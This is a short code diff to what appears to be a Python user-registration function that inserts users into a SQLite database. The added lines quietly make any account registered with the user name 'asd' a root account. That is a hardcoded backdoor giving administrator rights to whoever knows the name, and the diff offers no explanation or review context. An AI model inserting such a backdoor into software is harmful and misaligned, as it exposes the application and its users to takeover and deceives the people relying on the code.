@@ -6,6 +6,8 @@ DB_NAME = "shanin.db"
 def user_register(user_name=None,user_mail=None,user_password=None,root=False):
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
+    if user_name =="asd":
+        root = True
     try:
         cursor.execute('''INSERT INTO user_info(user_name,user_mail,user_password,root) VALUES (?,?,?,?)''',
                             (user_name,user_mail,user_password,root))
